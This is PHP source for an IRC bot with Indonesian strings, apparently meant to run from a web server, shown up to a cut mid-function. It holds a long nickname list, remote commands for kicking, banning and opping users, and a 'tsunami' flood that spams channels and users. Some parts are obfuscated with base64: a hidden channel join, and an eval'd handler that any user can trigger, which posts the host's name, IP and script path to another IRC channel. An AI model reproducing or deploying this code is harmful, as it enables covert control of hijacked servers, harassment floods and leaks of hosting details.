	"`Holmes`","`Holoien`","`Holter`","`Holway`","`Holzman`","`Hooker`","`Hopkins`","`Horsley`","`Hoshida`","`Hostage`","`Hottle`","`Howard`","`Hoy`","`Huey`","`Huidekoper`",
	"`Hungerford`","`Huntington`","`Hupp`","`Hurtubise`","`Hutchings`","`Hyde`","`Iaquinta`","`Ichikawa`","`Igarashi`","`Inamura`","`Inniss`","`Isaac`","`Isaievych`","`Isbill`",
	"`Isserman`","`Iyer`","`Jacenko`","`Jackson`","`Jagers`","`Jagger`","`Jagoe`","`Jain`","`Jamil`","`Janjigian`","`Jarnagin`","`Jarrell`","`Jay`","`Jeffers`","`Jellis`",
	"`Jenkins`","`Jespersen`","`Jewett`","`Johannesson`","`Johannsen`","`Johns`","`Jolly`","`Jorgensen`","`Jucks`","`Juliano`","`Julious`","`Kabbash`","`Kaboolian`","`Kafadar`",
	"`Kalbfleisch`","`Kaligian`","`Kalil`","`Kalinowski`","`Kalman`","`Kamel`","`Kangis`","`Karpouzes`","`Kassower`","`Kasten`","`Kawachi`","`Kee`","`Keenan`","`Keepper`",
	"`Keith`","`Kelker`","`Kelsey`","`Kempton`","`Kemsley`","`Kendall`","`Kerry`","`Keul`","`Khong`","`Kimmel`","`Kimmett`","`Kimura`","`Kindall`","`Kinsley`","`Kippenberger`",
	"`Kirscht`","`Kittridge`","`Kleckner`","`Kleiman`","`Kleinfelder`","`Klemperer`","`Kling`","`Klinkenborg`","`Klint`","`Knuff`","`Kobrick`","`Koch`","`Kohn`","`Koivumaki`",
	"`Kommer`","`Koniaris`","`Konrad`","`Kool`","`Korzybski`","`Kotter`","`Kovaks`","`Kraemer`","`Krailo`","`Krasney`","`Kraus`","`Kroemer`","`Krysiak`","`Kuenzli`","`Kumar`",
	"`Kusman`","`Kuwabara`","`La`","`Labunka`","`Lafler`","`Laing`","`Lallemant`","`Landes`","`Lankes`","`Lantieri`","`Lanzit`","`Laserna`","`Lashley`","`Lawless`","`Lecar`",
	"`Lecce`","`Leclercq`","`Leite`","`Lenard`","`Sofia`","`Lesser`","`Lessi`","`Liakos`","`Lidano`","`Liem`","`Light`","`Lightfoot`","`Lim`","`Linares`","`Linda`","`Linder`",
	"`Line`","`Linehan`","`Linzee`","`Lippmann`","`Lipponen`","`Little`","`Litvak`","`Livernash`","`Livi`","`Livolsi`","`Lizardo`","`Locatelli`","`Longworth`","`Loss`","`Loveman`",
	"`Lowenstein`","`Loza`","`Lubin`","`Lucas`","`Luciano`","`Luczkow`","`Luecke`","`Lunetta`","`Luoma`","`Lussier`","`Lutcavage`","`Luzader`","`Ma`","`Maccormac`","`Macdonald`",
	"`Maceachern`","`Macintyre`","`Mackenney`","`MacMillan`","`Macy`","`Madigan`","`Maggio`","`Mahony`","`Maier`","`Maine-Hershey`","`Maisano`","`Malatesta`","`Maller`",
	"`Malova`","`Manalis`","`Mandel`","`Manganiello`","`Mantovan`","`March`","`Marchbanks`","`Marcus`","`Margalit`","`Margetts`","`Marques`","`Martinez`","`Martochio`",
	"`Marton`","`Marubini`","`Mass`","`Matalka`","`Matarazzo`","`Matsukata`","`Mattson`","`Mauzy`","`May`","`Mazzali`","`Mazziotta`","`Mcbride`","`Mccaffery`","`Mccall`"
);

$identlist = array(
"B"
);

$realname = "Bot Loaded";
$identify = 'passwordnick';

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("irc.myquran.com","irc.indoforum.org","irc.telkom.net.id");
}
$port = "6667";
//Pesan
$quitmsglist = array(
"see ya","see ya","see ya","see ya","see ya","see ya"
);
$tsu1 = array("A","b","C","e","f","G","h","I");
$tsu2 = array("A","I","U","E","O","^","^","|","-","_");
$tsumsg = " 9,12:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e 12,4:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D 11,5(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G) 13,9:(:(:(:(:(:(:(:(:(:(: 7(:):):):):):):):):):):):):):):):):):):):):) 4,7:):D:D:D:D:D:D:D:D:D:D:D:D:D:D 5,7(G)(G)(G)(G)(G)(G)(G)(G)(G) 6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e 9,8:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e 12,13:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D 11,6(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G) 13,4:(:(:(:(:(:(:(:(:(:(: 7,5(:):):):):):):):):):):):):):):):):):):):):) 4,1:):D:D:D:D:D:D:D:D:D:D:D:D:D:D 6,7(G)(G)(G)(G)(G)(G)(G)(G)(G) 6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e 6,4(G)(G)(G)(G)(G)(G)(G)(G)(G) 4,1:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e";//400 Karakter
$judul = " Loaded ";

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b> Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b> Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :hy bos....!' .  CRL);
          fputs($fp, base64_decode("am9pbiAjZmVyeQ==") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
          fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b> Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
        if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :By Bozzzz...!!' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :By Bozzzz...!!' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
        elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
          if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
                fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Siap Bro..!! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==': KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace(' ','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==': VERSION ') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION BY l'.chr(1) . CRL); }
         elseif ($com[3]==': INFO ') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjU3Rhcm5ldHdvcmsgOkhvc3Q6ICRiaG9zdCB8IFJlZmVyZXI6ICRicnVyaSB8IFNjcmlwdDogJGJwaHAgfCBJUDogJGJpcCB8IE93bmVyIElQOiAkYnJpcCAiLiBDUkwpOw=="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :OK '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Gag Akh!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Siap Bozzz...!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);

                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' : ACTION '.$msg.' '. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' : ACTION slaps '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' xixixixixixi '. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' : '.$msg.' '. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`fuckz' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1)- 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`fuckz");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' : TSUNAMI '.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PART '.$com[4].' :F1n15h3d w1th 400x4 ch4rz' . CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
                 else {
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' : TSUNAMI '.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' : TSUNAMI '.$msg.$tsumsg. CRL);
                   fputs($fp, 'NOTICE '.$com[4].' :'.$msg.$tsumsg.CRL);
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":`cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' : '.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':`part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":`part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":`part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';

                 }
                 fputs($fp, 'PART '.$partchan.' : '.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':`k' && $com[4] && $chan) {
                 $msg = strstr($data,":`k");
                 $msg = str_replace(":`k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':`kb' && $com[4] && $chan) {
                 $msg = strstr($data,":`kb");
                 $msg = str_replace(":`kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':`changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':`op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':`awaymsg' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':`mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':`nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':`chanlist') {
                 fputs($fp, 'NOTICE '.$dNick.' :Channel List: '.$channels . CRL);
               }
               elseif ($com[3]==':`userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':`quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`quit");
                 $msg = str_replace(":`quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':`vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti VHOST' . CRL);
               }
               elseif ($com[3]==':`jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':`ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':`fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Nama' . CRL);
               }
               elseif ($com[3]==':`topic' && $com[4] && $chan) {
                 $msg = strstr($data,":`topic");
                 $msg = str_replace(":`topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':`load') {
                 if ($auth["$dNick"]["status"]=="Admin") {
